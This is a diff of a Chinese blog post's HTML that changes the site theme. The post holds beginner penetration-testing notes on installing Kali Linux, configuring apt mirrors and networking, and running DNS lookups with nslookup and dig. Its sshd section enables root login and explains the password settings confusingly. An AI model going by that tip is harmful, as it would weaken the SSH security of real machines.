@@ -1,138 +1,344 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="utf-8">
-  
-  
-  <title>渗透测试学习 | Hexo</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="渗透测试学习过程梳理–20220514Section 1 渗透测试系统安装一、.kali系统安装1.1kali渗透测试系统简介Kali Linux是基于Debian的Linux发行版， 设计用于数字取证操作系统。每一季度更新一次。由Offensive Security Ltd维护和资助。最先由Offensive Security的Mati Aharoni和Devon Kearns通过重写BackT">
-<meta property="og:type" content="article">
-<meta property="og:title" content="渗透测试学习">
-<meta property="og:url" content="http://example.com/2022/06/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="渗透测试学习过程梳理–20220514Section 1 渗透测试系统安装一、.kali系统安装1.1kali渗透测试系统简介Kali Linux是基于Debian的Linux发行版， 设计用于数字取证操作系统。每一季度更新一次。由Offensive Security Ltd维护和资助。最先由Offensive Security的Mati Aharoni和Devon Kearns通过重写BackT">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="c:/Users/Thaygo/AppData/Roaming/Typora/typora-user-images/image-20220514100518890.png">
-<meta property="og:image" content="c:/Users/Thaygo/AppData/Roaming/Typora/typora-user-images/image-20220514114100415.png">
-<meta property="og:image" content="c:/Users/Thaygo/AppData/Roaming/Typora/typora-user-images/image-20220514114306649.png">
-<meta property="og:image" content="c:/Users/Thaygo/AppData/Roaming/Typora/typora-user-images/image-20220603155009987.png">
-<meta property="og:image" content="c:/Users/Thaygo/AppData/Roaming/Typora/typora-user-images/image-20220603155657146.png">
-<meta property="og:image" content="c:/Users/Thaygo/AppData/Roaming/Typora/typora-user-images/image-20220604073640372.png">
-<meta property="og:image" content="c:/Users/Thaygo/AppData/Roaming/Typora/typora-user-images/image-20220604073802835.png">
-<meta property="og:image" content="c:/Users/Thaygo/AppData/Roaming/Typora/typora-user-images/image-20220604083158137.png">
-<meta property="article:published_time" content="2022-06-23T16:02:06.000Z">
-<meta property="article:modified_time" content="2022-06-29T16:31:21.972Z">
-<meta property="article:author" content="John Doe">
-<meta property="article:tag" content="Penetraion">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="c:/Users/Thaygo/AppData/Roaming/Typora/typora-user-images/image-20220514100518890.png">
-  
-    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
-  
-  
-    <link rel="shortcut icon" href="/favicon.png">
-  
-  
-    
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+	<head>
+		
+<title>渗透测试学习-Quiet</title>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<link rel="shortcut icon" type="image/x-icon" href="/image/favicon.ico">
 
-  
-  
-<link rel="stylesheet" href="/css/style.css">
+<link rel="stylesheet" href="/css/index.css">
 
-  
-    
-<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
 
-  
-<meta name="generator" content="Hexo 6.2.0"></head>
 
-<body>
-  <div id="container">
-    <div id="wrap">
-      <header id="header">
-  <div id="banner"></div>
-  <div id="header-outer" class="outer">
-    <div id="header-title" class="inner">
-      <h1 id="logo-wrap">
-        <a href="/" id="logo">Hexo</a>
-      </h1>
-      
+<meta name="keywords" content="Penetraion,">
+<meta name="description" content="">
+
+
+<script src="/js/jquery.min.js"></script>
+
+
+<script src="/js/index.js"></script>
+
+
+<script src="/js/fancybox.umd.js"></script>
+
+
+<script src="/js/fancybox-images.js"></script>
+
+
+<script src="/js/gitalk.min.js"></script>
+
+
+<script src="/js/hljs.min.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+	<meta name="generator" content="Hexo 6.2.0"></head>
+
+	<body>
+		
+	<div class="header">
+		<div class="header-top" id="header-top">
+			<div class="h-left">
+				<a href="/">
+					<img src="/image/logo.png" alt="Quiet">
+				</a>
+			</div>
+			<div class="h-right">
+				<ul>
+					
+						
+								<li>
+									<a href="/">
+										HOME
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/archives">
+										ARCHIVE
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/categories">
+										CATEGORIES
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/tags">
+										TAGS
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/links">
+										LINKS
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+						
+								<li>
+									<a href="/about">
+										ABOUT
+									</a>
+									<span class="dot"></span>
+								</li>
+								
+									
+				</ul>
+			</div>
+			<div class="h-right-close">
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24">
+					<path fill="none" d="M0 0h24v24H0z" />
+					<path d="M3 4h18v2H3V4zm0 7h18v2H3v-2zm0 7h18v2H3v-2z" fill="rgba(68,68,68,1)" />
+				</svg>
+			</div>
+		</div>
+	</div>
+	<div class="sidebar">
+    <div class="topo">
+        <h2>Joey</h2>
     </div>
-    <div id="header-inner" class="inner">
-      <nav id="main-nav">
-        <a id="main-nav-toggle" class="nav-icon"></a>
+    <ul>
         
-          <a class="main-nav-link" href="/">Home</a>
+        <li>
+            <a href="/">HOME</a>
+        </li>
         
-          <a class="main-nav-link" href="/archives">Archives</a>
+        <li>
+            <a href="/archives">ARCHIVE</a>
+        </li>
         
-      </nav>
-      <nav id="sub-nav">
+        <li>
+            <a href="/categories">CATEGORIES</a>
+        </li>
         
-          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        <li>
+            <a href="/tags">TAGS</a>
+        </li>
         
-        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
-      </nav>
-      <div id="search-form-wrap">
-        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
-      </div>
+        <li>
+            <a href="/links">LINKS</a>
+        </li>
+        
+        <li>
+            <a href="/about">ABOUT</a>
+        </li>
+        
+    </ul>
+    <div class="my_foot">
+        
+        <a target="_blank" rel="noopener" href="https://github.com/79E/hexo-theme-quiet">
+            <img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+        </a>
+        
     </div>
-  </div>
-</header>
+</div>
+<div class='shelter'>
+</div>
+<style>
+    .shelter{
+        background-color: #333;
+        opacity:0.5;
+        cursor: pointer;
+        display: none; 
+        position: fixed;
+        left: 0;
+        top: 0; 
+        right: 0;
+        bottom: 0;
+        z-index: 1998;
+    }
+    .sidebar {
+        width: 0;
+        height: 100%;
+        position: fixed;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        background: #fff;
+        z-index: 1999;
+        text-align: center;
+        box-shadow: -6px 0 20px rgba(98, 94, 94, .815)
+    }
 
-      <div class="outer">
-        <section id="main"><article id="post-渗透测试" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/06/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="article-date">
-  <time class="dt-published" datetime="2022-06-23T16:02:06.000Z" itemprop="datePublished">2022-06-24</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
+    .topo {
+        width: 100%;
+        height: 200px;
+        background: url(https://api.ixiaowai.cn/gqapi/gqapi.php) no-repeat;
+        background-size: 100% 100%;
+        position: relative;
+        display: flex;
+        align-items: flex-end
+    }
+
+    .topo h2 {
+        color: #fff;
+        z-index: 1;
+        position: relative;
+        margin: 0 0 10px 10px;
+        font-size: 1.2em;
+        box-sizing: border-box
+    }
+
+    .topo:before {
+        content: '';
+        background-image: url(/image/pattern.png);
+        background-repeat: repeat;
+        height: 100%;
+        left: 0;
+        position: absolute;
+        top: 0;
+        width: 100%;
+        z-index: 1
+    }
+
+    .sidebar ul {
+        width: 100%;
+        margin-top: 50px
+    }
+
+    .sidebar ul li {
+        height: 50px;
+        list-style: none;
+        font-size: 1.2em;
+        text-align: right;
+        margin-right: 10px
+    }
+
+    .sidebar ul li a {
+        display: grid;
+        color: #5d606a;
+        text-overflow: ellipsis;
+        width: 100%;
+        text-decoration: none
+    }
+
+    .my_foot {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 10px;
+        position: absolute;
+        bottom: 0
+    }
+
+    .my_foot a {
+        text-decoration: none;
+        margin-right: 10px;
+        display: inline-block
+    }
+
+    .my_foot a img {
+        width: 30px;
+        height: 30px
+    }
+</style>
+
+<script>
+    $( function () {
+	$( '.h-right-close>svg' )
+		.click( function () {
+			$( '.sidebar' )
+				.animate( {
+					width: "66%"
+				}, 500 );
+			$( '.shelter' )
+				.fadeIn( "slow" )
+		} );
+	$( '.shelter' )
+		.click( function ( e ) {
+			$( '.sidebar' )
+				.animate( {
+					width: "0"
+				}, 500 );
+			$( '.shelter' )
+				.fadeOut( "slow" )
+		} )
+} )
+
+</script>
+
+<div class="post">
+    <div class="post-header-background post-header-img"
+    style="background: url('http://eett.cc/pictures?type=pc&category=fengjing')" 
+>
+    <div class="post-header-background-content">
+        <ul class="post-header-tag">
+            
+            
+            <li><a href="/tags/Penetraion">Penetraion</a></li>
+            
+            
+        </ul>
         
-  
-    <h1 class="p-name article-title" itemprop="headline name">
-      渗透测试学习
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="渗透测试学习过程梳理–20220514"><a href="#渗透测试学习过程梳理–20220514" class="headerlink" title="渗透测试学习过程梳理–20220514"></a>渗透测试学习过程梳理–20220514</h1><h2 id="Section-1-渗透测试系统安装"><a href="#Section-1-渗透测试系统安装" class="headerlink" title="Section 1 渗透测试系统安装"></a>Section 1 渗透测试系统安装</h2><h3 id="一、-kali系统安装"><a href="#一、-kali系统安装" class="headerlink" title="一、.kali系统安装"></a>一、.kali系统安装</h3><h4 id="1-1kali渗透测试系统简介"><a href="#1-1kali渗透测试系统简介" class="headerlink" title="1.1kali渗透测试系统简介"></a>1.1kali渗透测试系统简介</h4><p><strong>Kali Linux是基于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Debian/748667">Debian</a>的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Linux/27050">Linux</a>发行版， 设计用于数字取证操作系统。每一季度更新一次。由Offensive Security Ltd维护和资助。最先由Offensive Security的Mati Aharoni和Devon Kearns通过重写BackTrack来完成，BackTrack是他们之前写的用于取证的Linux发行版 。</strong></p>
+        <h1>渗透测试学习</h1>
+        <div class="post-header-info">
+            <div class="post-header-info-author">
+                
+                    <svg t="1604839279282" class="icon" viewBox="0 0 1024 1024" version="1.1"
+                        xmlns="http://www.w3.org/2000/svg" p-id="2901" width="20" height="20">
+                        <path
+                            d="M513 956.3c-247.7 0-448-200.3-448-448S265.3 66.2 513 66.2s448 200.3 448 448-200.3 442.1-448 442.1z m0-830.9c-212.2 0-388.8 170.7-388.8 388.8C124.2 726.3 294.9 903 513 903c212.2 0 388.8-170.7 388.8-388.8S725.2 125.4 513 125.4z m0 430.2c-94.2 0-170.7-76.5-170.7-170.7S418.8 207.8 513 207.8s170.7 76.5 170.7 170.7S607.2 555.6 513 555.6z m0-289.1c-64.6 0-112 52.8-112 112s47.4 117.9 112 117.9 112-52.8 112-112-47.4-117.9-112-117.9z m0 689.8c-135.7 0-259-58.7-341.9-158.9l-11.8-17.8 11.8-17.8c76.5-117.9 206.2-188.5 347.8-188.5 135.7 0 265 64.6 341.9 182.6l11.8 17.8-11.8 17.8C778 897.1 648.7 956.3 513 956.3zM230.3 773.2C300.9 849.7 406.9 897 513 897c112 0 218.1-47.4 288.6-129.8-70.5-88.2-170.7-135.6-282.7-135.6s-218.1 53.3-288.6 141.6z"
+                            p-id="2902" fill="#ffffff"></path>
+                    </svg>
+                    
+                <span class="post-header-info-author-text"> <a href="../../about">Joey</a></span>
+                <div class="post-header-info-author-categories">
+                    
+                </div>
+                <p>2022-06-24 00:02:06</p>
+            </div>
+        </div>
+    </div>
+</div>
+    <div class="post-content" id="content">
+  <div id="article" class="post-content-info">
+      <h1 id="渗透测试学习过程梳理–20220514"><a href="#渗透测试学习过程梳理–20220514" class="headerlink" title="渗透测试学习过程梳理–20220514"></a>渗透测试学习过程梳理–20220514</h1><h2 id="Section-1-渗透测试系统安装"><a href="#Section-1-渗透测试系统安装" class="headerlink" title="Section 1 渗透测试系统安装"></a>Section 1 渗透测试系统安装</h2><h3 id="一、-kali系统安装"><a href="#一、-kali系统安装" class="headerlink" title="一、.kali系统安装"></a>一、.kali系统安装</h3><h4 id="1-1kali渗透测试系统简介"><a href="#1-1kali渗透测试系统简介" class="headerlink" title="1.1kali渗透测试系统简介"></a>1.1kali渗透测试系统简介</h4><p><strong>Kali Linux是基于<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Debian/748667">Debian</a>的<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Linux/27050">Linux</a>发行版， 设计用于数字取证操作系统。每一季度更新一次。由Offensive Security Ltd维护和资助。最先由Offensive Security的Mati Aharoni和Devon Kearns通过重写BackTrack来完成，BackTrack是他们之前写的用于取证的Linux发行版 。</strong></p>
 <p><strong>Kali Linux</strong>预装了许多渗透测试软件，包括nmap 、Wireshark 、John the Ripper，以及Aircrack-ng.用户可通过硬盘、live CD或live USB运行Kali Linux。Kali Linux既有<strong>32位****和</strong>64位*<em><strong>的镜像。可用于x86 指令集。同时还有基于</strong>ARM架构的镜像</em>*，可用于树莓派和三星的ARM Chromebook</p>
 <p>kali支持多平台。windows,linux,mobiles 以及live boot(USB disk) 等</p>
 <h4 id="1-2使用VM创建kali虚拟机"><a href="#1-2使用VM创建kali虚拟机" class="headerlink" title="1.2使用VM创建kali虚拟机"></a>1.2使用VM创建kali虚拟机</h4><p>下载kali官方镜像文件：<a target="_blank" rel="noopener" href="http://www.kali.org/">www.kali.org</a> 国外网站，下载速度很慢</p>
 <p>下载方式分成两种http和ftp</p>
 <p><img src="C:\Users\Thaygo\AppData\Roaming\Typora\typora-user-images\image-20220514100518890.png" alt="image-20220514100518890"></p>
-<h4 id="1-3配置apt安装源地址"><a href="#1-3配置apt安装源地址" class="headerlink" title="1.3配置apt安装源地址"></a>1.3配置apt安装源地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/apt/sources.list</span><br></pre></td></tr></table></figure>
+<h4 id="1-3配置apt安装源地址"><a href="#1-3配置apt安装源地址" class="headerlink" title="1.3配置apt安装源地址"></a>1.3配置apt安装源地址</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs En">vi /etc/apt/sources.list<br></code></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 官方源</span><br><span class="line"># deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line"># deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">#根据需要自己选一个，中科大的还可以</span><br><span class="line">#中科大</span><br><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">#阿里云</span><br><span class="line">#deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">#清华大学</span><br><span class="line">#deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#浙大</span><br><span class="line">#deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#deb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">#东软大学</span><br><span class="line">#deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">#deb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span><br><span class="line">#重庆大学</span><br><span class="line">#deb http://http.kali.org/kali kali-rolling main non-free contrib</span><br><span class="line">#deb-src http://http.kali.org/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="二、配置网络和服务"><a href="#二、配置网络和服务" class="headerlink" title="二、配置网络和服务"></a>二、配置网络和服务</h3><h4 id="2-1配置静态IP"><a href="#2-1配置静态IP" class="headerlink" title="2.1配置静态IP"></a>2.1配置静态IP</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#修改配置文件</span><br><span class="line">vi /etc/network/interfaces</span><br><span class="line">#修改完成,重启网络服务</span><br><span class="line">systemctl restart networking</span><br></pre></td></tr></table></figure>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># 官方源</span><br><span class="hljs-meta"># deb http:<span class="hljs-comment">//http.kali.org/kali kali-rolling main non-free contrib</span></span><br><span class="hljs-meta"># deb-src http:<span class="hljs-comment">//http.kali.org/kali kali-rolling main non-free contrib</span></span><br><span class="hljs-meta">#根据需要自己选一个，中科大的还可以</span><br><span class="hljs-meta">#中科大</span><br>deb http:<span class="hljs-comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br>deb-src http:<span class="hljs-comment">//mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="hljs-meta">#阿里云</span><br><span class="hljs-meta">#deb http:<span class="hljs-comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="hljs-meta">#deb-src http:<span class="hljs-comment">//mirrors.aliyun.com/kali kali-rolling main non-free contrib</span></span><br><span class="hljs-meta">#清华大学</span><br><span class="hljs-meta">#deb http:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="hljs-meta">#deb-src https:<span class="hljs-comment">//mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="hljs-meta">#浙大</span><br><span class="hljs-meta">#deb http:<span class="hljs-comment">//mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="hljs-meta">#deb-src http:<span class="hljs-comment">//mirrors.zju.edu.cn/kali kali-rolling main contrib non-free</span></span><br><span class="hljs-meta">#东软大学</span><br><span class="hljs-meta">#deb http:<span class="hljs-comment">//mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span></span><br><span class="hljs-meta">#deb-src http:<span class="hljs-comment">//mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib</span></span><br><span class="hljs-meta">#重庆大学</span><br><span class="hljs-meta">#deb http:<span class="hljs-comment">//http.kali.org/kali kali-rolling main non-free contrib</span></span><br><span class="hljs-meta">#deb-src http:<span class="hljs-comment">//http.kali.org/kali kali-rolling main non-free contrib</span></span><br></code></pre></td></tr></table></figure>
 
 
 
-<h4 id="2-2配置临时ip的方法"><a href="#2-2配置临时ip的方法" class="headerlink" title="2.2配置临时ip的方法"></a>2.2配置临时ip的方法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig eth0 ip</span><br></pre></td></tr></table></figure>
+<h3 id="二、配置网络和服务"><a href="#二、配置网络和服务" class="headerlink" title="二、配置网络和服务"></a>二、配置网络和服务</h3><h4 id="2-1配置静态IP"><a href="#2-1配置静态IP" class="headerlink" title="2.1配置静态IP"></a>2.1配置静态IP</h4><figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#修改配置文件</span><br>vi <span class="hljs-regexp">/etc/</span>network/interfaces<br><span class="hljs-comment">#修改完成,重启网络服务</span><br>systemctl restart networking<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="2-2配置临时ip的方法"><a href="#2-2配置临时ip的方法" class="headerlink" title="2.2配置临时ip的方法"></a>2.2配置临时ip的方法</h4><figure class="highlight armasm"><table><tr><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">ifconfig</span> eth0 <span class="hljs-built_in">ip</span><br></code></pre></td></tr></table></figure>
 
 <h4 id="2-3vm-nat配置网络地址"><a href="#2-3vm-nat配置网络地址" class="headerlink" title="2.3vm nat配置网络地址"></a>2.3vm nat配置网络地址</h4><p>打开网络编辑器，查看nat网卡的net配置，根据配置，修改配置文件&#x2F;etc&#x2F;network&#x2F;interfaces</p>
 <p>重启网络</p>
 <h4 id="2-4打开sshd服务"><a href="#2-4打开sshd服务" class="headerlink" title="2.4打开sshd服务"></a>2.4打开sshd服务</h4><p>修改sshd配置文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>
+<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">vi <span class="hljs-regexp">/etc/</span>ssh/sshd_config<br></code></pre></td></tr></table></figure>
 
 <p>注：将PermitRootLogin 改为yes表示允许root用户登陆</p>
 <p>prohibit-password 改为no 不允许密码登陆</p>
 <p>PubkeyAuthentication 改为yes，表示开启公钥验证，开启此项，允许xshell使用私钥登陆</p>
 <p>配置完成，重启sshd服务,并设置开机自启动</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">systemctl restart sshd</span><br><span class="line">systemctl enable sshd</span><br></pre></td></tr></table></figure>
+<figure class="highlight nsis"><table><tr><td class="code"><pre><code class="hljs nsis"><span class="hljs-params">system</span>ctl restart sshd<br><span class="hljs-params">system</span>ctl enable sshd<br></code></pre></td></tr></table></figure>
 
 
 
@@ -179,40 +385,40 @@
 <p>解析过程描述如下：</p>
 <p><img src="C:\Users\Thaygo\AppData\Roaming\Typora\typora-user-images\image-20220514114306649.png" alt="image-20220514114306649"></p>
 <h5 id="3-2-2-DNS信息收集–NSLOOKUP"><a href="#3-2-2-DNS信息收集–NSLOOKUP" class="headerlink" title="3.2.2 DNS信息收集–NSLOOKUP"></a>3.2.2 DNS信息收集–NSLOOKUP</h5><p>1.ping</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping baidu.com -c 1</span><br></pre></td></tr></table></figure>
+<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ping</span> baidu.com -c <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 
 <p>2.nslookup</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">─# nslookup baidu.com</span><br><span class="line">Server:		192.168.1.1</span><br><span class="line">Address:	192.168.1.1#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:	baidu.com</span><br><span class="line">Address: 220.181.38.148</span><br><span class="line">Name:	baidu.com</span><br><span class="line">Address: 220.181.38.251</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight avrasm"><table><tr><td class="code"><pre><code class="hljs avrasm">─<span class="hljs-meta"># nslookup baidu.com</span><br><span class="hljs-symbol">Server:</span>		<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><br><span class="hljs-symbol">Address:</span>	<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span><span class="hljs-meta">#53</span><br><br>Non-authoritative answer:<br><span class="hljs-symbol">Name:</span>	baidu.com<br><span class="hljs-symbol">Address:</span> <span class="hljs-number">220.181</span><span class="hljs-number">.38</span><span class="hljs-number">.148</span><br><span class="hljs-symbol">Name:</span>	baidu.com<br><span class="hljs-symbol">Address:</span> <span class="hljs-number">220.181</span><span class="hljs-number">.38</span><span class="hljs-number">.251</span><br><br></code></pre></td></tr></table></figure>
 
 
 
 <p>3.3.3DNS信息收集 –DIG</p>
 <p>语法： dig [options] 域名</p>
 <p>查询A记录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">─# dig baidu.com</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.0-2-Debian &lt;&lt;&gt;&gt; baidu.com</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Got answer:</span><br><span class="line">;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 31424</span><br><span class="line">;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="line"></span><br><span class="line">;; OPT PSEUDOSECTION:</span><br><span class="line">; EDNS: version: 0, flags:; udp: 4096</span><br><span class="line">;; QUESTION SECTION:</span><br><span class="line">;baidu.com.			IN	A</span><br><span class="line"></span><br><span class="line">;; ANSWER SECTION:</span><br><span class="line">baidu.com.		300	IN	A	220.181.38.251</span><br><span class="line">baidu.com.		300	IN	A	220.181.38.148</span><br><span class="line"></span><br><span class="line">;; Query time: 0 msec</span><br><span class="line">;; SERVER: 192.168.1.1#53(192.168.1.1) (UDP)</span><br><span class="line">;; WHEN: Sat May 14 03:52:57 UTC 2022</span><br><span class="line">;; MSG SIZE  rcvd: 70</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">─#</span> <span class="hljs-string">dig</span> <span class="hljs-string">baidu.com</span><br><br><span class="hljs-string">;</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-string">DiG</span> <span class="hljs-number">9.18</span><span class="hljs-number">.0</span><span class="hljs-number">-2</span><span class="hljs-string">-Debian</span> <span class="hljs-string">&lt;&lt;&gt;&gt;</span> <span class="hljs-string">baidu.com</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">global options:</span> <span class="hljs-string">+cmd</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">Got answer:</span><br><span class="hljs-string">;;</span> <span class="hljs-string">-&gt;&gt;HEADER&lt;&lt;-</span> <span class="hljs-attr">opcode:</span> <span class="hljs-string">QUERY,</span> <span class="hljs-attr">status:</span> <span class="hljs-string">NOERROR,</span> <span class="hljs-attr">id:</span> <span class="hljs-number">31424</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">flags:</span> <span class="hljs-string">qr</span> <span class="hljs-string">rd</span> <span class="hljs-string">ra;</span> <span class="hljs-attr">QUERY:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">ANSWER:</span> <span class="hljs-number">2</span><span class="hljs-string">,</span> <span class="hljs-attr">AUTHORITY:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-attr">ADDITIONAL:</span> <span class="hljs-number">1</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">OPT PSEUDOSECTION:</span><br><span class="hljs-string">;</span> <span class="hljs-attr">EDNS: version:</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-string">flags:;</span> <span class="hljs-attr">udp:</span> <span class="hljs-number">4096</span><br><span class="hljs-string">;;</span> <span class="hljs-attr">QUESTION SECTION:</span><br><span class="hljs-string">;baidu.com.</span>			<span class="hljs-string">IN</span>	<span class="hljs-string">A</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">ANSWER SECTION:</span><br><span class="hljs-string">baidu.com.</span>		<span class="hljs-number">300</span>	<span class="hljs-string">IN</span>	<span class="hljs-string">A</span>	<span class="hljs-number">220.181</span><span class="hljs-number">.38</span><span class="hljs-number">.251</span><br><span class="hljs-string">baidu.com.</span>		<span class="hljs-number">300</span>	<span class="hljs-string">IN</span>	<span class="hljs-string">A</span>	<span class="hljs-number">220.181</span><span class="hljs-number">.38</span><span class="hljs-number">.148</span><br><br><span class="hljs-string">;;</span> <span class="hljs-attr">Query 